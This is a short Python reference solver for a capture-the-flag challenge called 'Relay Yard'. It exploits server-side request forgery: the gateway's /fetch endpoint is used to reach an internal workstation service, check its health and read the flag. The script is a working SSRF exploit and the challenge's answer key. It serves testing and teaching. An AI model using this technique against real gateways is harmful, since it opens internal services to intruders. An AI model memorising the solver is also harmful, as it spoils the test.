#!/usr/bin/env python3
"""
Reference solver for Relay Yard.

Intended solve path: discover the gateway, confirm that `/fetch` can request
arbitrary HTTP URLs, then use it to reach the internal workstation service.
"""
import re
import sys
from urllib.parse import quote

import requests

FLAG_RE = re.compile(r"destrier\{[0-9a-f]{16}\}")
INTERNAL_BASE = "http://10.10.1.20:8001"


def fetch_through_gateway(base_url: str, target_url: str):
    encoded = quote(target_url, safe="")
    return requests.get(f"{base_url}/fetch?url={encoded}", timeout=10)


def solve(base_url: str):
    base_url = base_url.rstrip("/")

    # 1. Discover the gateway
    requests.get(f"{base_url}/", timeout=5)

    # 2. Confirm internal reachability through the gateway
    health = fetch_through_gateway(base_url, f"{INTERNAL_BASE}/health")
    assert "ok" in health.text, "internal workstation healthcheck not reachable"

    # 3. Read the flag from the internal workstation
    flag_response = fetch_through_gateway(base_url, f"{INTERNAL_BASE}/flag")
    match = FLAG_RE.search(flag_response.text)
    return match.group(0) if match else None


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("usage: solve.py <gateway_base_url>", file=sys.stderr)
        sys.exit(2)
    flag = solve(sys.argv[1])
    if not flag:
        print("FAILED: no flag recovered", file=sys.stderr)
        sys.exit(1)
    print(flag)
